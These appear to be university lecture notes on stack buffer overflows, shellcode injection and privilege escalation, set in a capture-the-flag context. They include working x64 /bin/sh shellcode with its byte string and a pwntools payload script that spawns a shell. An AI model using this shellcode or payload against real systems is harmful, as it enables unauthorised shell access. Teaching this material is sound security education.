# Shellcode and privilege escalation

## Introductions

- introductions of two students

## Key concepts

### Basic buffer overflow

We have previously used a buffer overflow to overwrite the return address with
an address of our choosing. For example, this could go into the code block to
execute some functionality that was not intended. In our toy examples this code
would print out a congratulations message or a flag, but a more dangerous piece
of code might grant the user administrative privileges.

### Injecting code onto the stack

A more advanced attack injects code onto the stack, then writes the return
address to point to that code. The attack code could come before or after the
return address. In case the return address doesn't point exactly to the start of
the injected code, the attacker can add a NOP sled in front of the code.

The injected code could execute:

- `cat /flag.txt` in a CTF contest
- `/bin/sh` if wanting to create a shell (which then lets the attacker execute
  any other command)

### The execve() system call

The `execve` system call allows a program to transform itself into a new process
-- "stop running my program, and run this other program instead". Never returns
to the calling program unless an error occurred when creating the new process
image.

```c
#include <unistd.h>

int execve(const char *pathname, char *const _Nullable argv[],
           char *const _Nullable envp[]);
```

- `pathname` is the path to a binary executable
- `argv` is an array of arguments for the program
- `envp` is an array of environment variables of the form `key=value`

Your shell might use this to start a program when you type a command at the
prompt:

```c
char *name[2];
name[0] = "curl";
name[1] = 'https://someURL.com';
execve("/usr/bin/curl", name, NULL);
```

### Shellcode

When an attacker injects code, it is really useful to have that code spawn a
shell. They can do this using `execve` to start `/bin/sh`. To write shellcode:

- write assembly to launch the shell
- compile this into a binary
- extract the raw bytes to use for injection

Here is some
[example shellcode](https://book.jorianwoltjer.com/binary-exploitation/shellcode)
for the x64 architecture:

```asm
.global _start
_start:
.intel_syntax noprefix
        mov rax, 59           ; choose which syscall: execve (see x64.syscall.sh)
        lea rdi, [rip+binsh]  ; set a *pointer* to the /bin/sh string as 1st argument
        mov rsi, 0            ; set 2nd argument (argv[]) to NULL
        mov rdx, 0            ; set 3rd argument (envp[]) to NULL
        syscall               ; perform the syscall we set up
binsh:
        .string "/bin/sh"     ; include the string we referenced
```

You can then compile this and convert it to an ascii representation:

```sh
# compile
gcc -nostdlib -static shellcode.s -o shellcode-elf
# convert to raw
objcopy --dump-section .text=shellcode-raw shellcode-elf
# hexdump to ascii
hexdump -v -e '"\\" 1/1 "x%02x"' shellcode-raw; echo
```

This is the resulting string:

```
\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00
```

To complete the attack manually, you can use `gdb` to identify the address of
the area where the code is located, using this to overwrite the return address.

### Simplifying the attack

You can use `pwntools` to greatly simplify a buffer overflow attack. A
[video from CryptoCat](https://www.youtube.com/watch?v=4zut2Mjgh5M) walks
through this process in detail. The script below shows the primary pieces of the
attack.

```python
# Offset to EIP (return address)
padding = 76

# Assemble the byte sequence for 'jmp esp' so we can search for it
# This finds a "jump esp" instruction that already exists in the binary, and points to the address of
# that instruction. The ESP will point to the memory location right after the return address, which
# is where you will put your payload.
jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))

# shellcode to run /bin/sh
shellcode = asm(shellcraft.sh())
# you could alternatively have shellcode to print the flag
# shellcode = asm(shellcraft.cat('flag.txt'))

# Build payload
payload = flat(
    asm('nop') * padding,
    jmp_esp,
    asm('nop') * 16,
    shellcode
)

# Write payload to file to use later
write("payload", payload)

# Exploit
io.sendlineafter(b':', payload)

# Get flag/shell
io.interactive()
```

### Privilege escalation

Privilege escalation occurs any time an attacker is able to increase their
privileges. For example:

- moving from existing program functionality to running a shell
- moving from a sandbox to the entire filesystem
- moving from a non-root account to a root account
- moving from user space privileges to kernel-mode privileges

Our shellcode examples fall under the first category.
